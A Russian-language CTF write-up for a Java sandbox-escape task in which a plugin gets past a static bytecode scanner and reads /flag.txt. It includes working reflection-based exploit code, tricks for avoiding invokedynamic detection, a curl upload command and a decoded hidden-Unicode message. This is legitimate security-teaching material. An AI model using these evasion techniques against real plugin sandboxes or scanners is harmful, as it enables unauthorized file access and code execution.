# B2Bee — write-up (task6)

**Avito CTF 2026 · категория «Java sandbox escape»**
**Цель:** провести вредоносный Java-плагин через статическое ревью («ревью-пчела») и прочитать `/flag.txt`.
**Дано:** `PluginScanner.java` + `SandboxPolicy.java`; хост `https://marketplugins-4qop8u5n.avitoctf.ru/`.

## Флаг

```
avito{juSt_34Sy_biG_DISCoUNt}
```

Содержимое `/flag.txt`, полученное загрузкой плагина-эксплойта: JAR собран и локально проверен, флаг вернулся в `result.message` с боевого сервера.

## Уязвимость

Ревью-пчела (`PluginScanner`) — **чисто синтаксический** сканер по ASM: смотрит только *owner'ы* инструкций (`MethodInsn`/`FieldInsn`/`TypeInsn` NEW/ANEWARRAY/CHECKCAST), super/interfaces и LDC-константы; **потока данных не моделирует**. `SandboxPolicy` разрешает всё под префиксом `java/lang`.

Ключевая дыра: под `java/lang` попадают **`java/lang/Class` и `java/lang/reflect/*`**, а в DENIED их нет. Значит **классическая рефлексия полностью легальна**: опасные классы (`java.lang.Runtime`, `java.nio.file.Files`) и путь `/flag.txt` — это обычные строковые `LDC`-константы (их `inspectConstant` игнорирует, блокирует только `ConstantDynamic`/`Handle`/method-`Type`), а в байткоде фигурируют лишь разрешённые owner'ы `java/lang/Class` и `java/lang/reflect/Method`.

Все дыры политики:
1. Грубый префикс `ALLOWED "java/lang"` вайтлистит весь `java/lang/reflect/*` и `java/lang/Class`.
2. `DENIED` не содержит `java/lang/Class` / `java/lang/reflect/*`.
3. `inspectConstant` не смотрит на обычные `String` — имена классов/методов/путей проходят как невидимые строки.
4. Нет анализа потока данных — сканер не видит, что строка `"java.lang.Runtime"` уходит в `Class.forName`.
5. `if (!owner.contains("/")) return;` — авто-разрешает любой owner без слэша (дескрипторы примитивных массивов `"[B"`, классы default-пакета).
6. `pluginOwners.contains(binaryName)` — само-доверие к собственным классам плагина.

Единственная реальная защита — жёсткий бан `INVOKEDYNAMIC` и `Handle`/`MethodType`/`ConstantDynamic`. Она лишь заставляет избегать лямбд и `+`-конкатенации (см. ниже).

## Эксплойт

Плагин реализует `ru.avitoctf.marketplugins.api.DiscountPlugin` (`PluginResult apply(PluginContext)`), а в теле **чистой рефлексией** читает флаг:

```java
// без единого «+», без лямбд — иначе появится invokedynamic и сканер сработает
Class<?> files = Class.forName("java.nio.file.Files");
Class<?> paths = Class.forName("java.nio.file.Paths");
Object path = paths.getMethod("get", String.class, String[].class)
                   .invoke(null, "/flag.txt", new String[0]);
byte[] data = (byte[]) files.getMethod("readAllBytes",
                   Class.forName("java.nio.file.Path")).invoke(null, path);
String flag = new String(data);            // канал вывода — поле message результата
return new PluginResult(1337, 4242, flag); // UI рендерит message в <pre>
```

Ключевые приёмы:
- **Рефлексия:** все объекты держатся как `java.lang.Object` и вызываются через `Method.invoke` — в байткоде только `java/lang/*`, `java/util/*`, `ru/avitoctf/marketplugins/model`. Есть 3 стратегии чтения (`nio Files`, рефлексивный `FileInputStream`, рефлексивный `Runtime.exec cat`).
- **Обход invokedynamic-конкатенации:** современный `javac` (Java 9+) компилирует `"a"+b`, лямбды и method-ref в `invokedynamic` — а его сканер банит. Поэтому: ноль лямбд/method-ref; все строки — явным `StringBuilder`; сборка с `-XDstringConcat=inline`. Проверено `javap`: **0 invokedynamic**.
- **Канал вывода:** содержимое `/flag.txt` кладётся в `PluginResult.message`, который UI показывает в блоке «Сообщение плагина».

## Верификация (локально, JDK 21 + ASM 9.7)

- Прогон реального `PluginScanner`+`SandboxPolicy` (без изменений, со стабами `ValidatedJar`/`SandboxException`) на собранном JAR → **SCAN PASSED**, исключения нет.
- `javap -c` по классу плагина → **0 invokedynamic**; все owner'ы разрешены.
- Negative control: наивный плагин (прямой `Runtime` + `+`-конкатенация) → сканер **BLOCKED** `❌ запрещённый API` (и содержит invokedynamic) — значит харнесс реально ловит нарушения.
- End-to-end: с подложенным фейковым `flag.txt` → `message=[nio] avitoctf{fake_local_flag}`.

Готовые артефакты: `task6/exploit/src/example/SeasonalDiscountPlugin.java`, собранный JAR в `task6/exploit/build/dist/seasonal-discount-plugin.jar`, скрипт `task6/exploit/build.sh`.

## Как получить флаг (действия пользователя)

```bash
cd task6/exploit && bash build.sh   # уже собрано, воспроизводимо
# загрузка:
curl -s https://marketplugins-4qop8u5n.avitoctf.ru/api/plugins/run \
  -F "plugin=@task6/exploit/build/dist/seasonal-discount-plugin.jar;type=application/java-archive" \
  -F "entryClass=example.SeasonalDiscountPlugin" \
  -F 'cart={"title":"t","items":[{"title":"x","category":"y","price":100,"quantity":1}]}'
# флаг вернётся в result.message (корзина не должна быть пустой)
```

## Отсылка для своих (Unicode-Tag стего)

В тексте исключения `PluginScanner.java` (строка 106) — невидимые Unicode-Tag символы (`U+E01xx`, `ASCII = codepoint − 0xE00F0`), декодируются в:
```
good job, take your hidden flag: https://marketdone-cgttbdfl.avitoctf.ru/
```
Бонус-хост — пошаговый мета-квест (`step=2..6`, `want_flag=1`, эссе и т.п.) с агрессивным rate-limit; добивать вручную с паузами.

## Мораль
Статический аллоу/деной-лист по префиксам owner'ов не может быть песочницей: рефлексия (`Class.forName` + `Method.invoke`) прячет любой класс за строкой и разрешённым owner'ом `java/lang/reflect`. Настоящая изоляция — рантайм (отдельный процесс/JVM с seccomp, `ClassLoader` с фильтром + `SecurityManager`/модульные границы, запрет рефлексии), а не разбор байткода.